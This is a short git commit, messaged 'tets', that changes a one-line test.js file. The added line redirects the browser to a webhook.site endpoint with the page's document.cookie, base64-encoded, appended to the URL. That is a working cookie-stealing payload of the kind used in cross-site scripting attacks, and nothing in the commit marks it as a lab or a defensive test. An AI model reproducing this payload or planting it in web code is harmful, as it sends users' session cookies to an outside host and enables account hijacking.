c7dac4d1091233267783e4904fc5a09c8c6029fe
gh0st <gh0st@nemesis.sh>
2023-06-12 12:19:05 -0400

    tets

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-window.location = "https://webhook.site/c5a8b14c-e980-476d-8776-3569940a6ce3"
+window.location = "https://webhook.site/c5a8b14c-e980-476d-8776-3569940a6ce3/?c"+btoa(document.cookie);
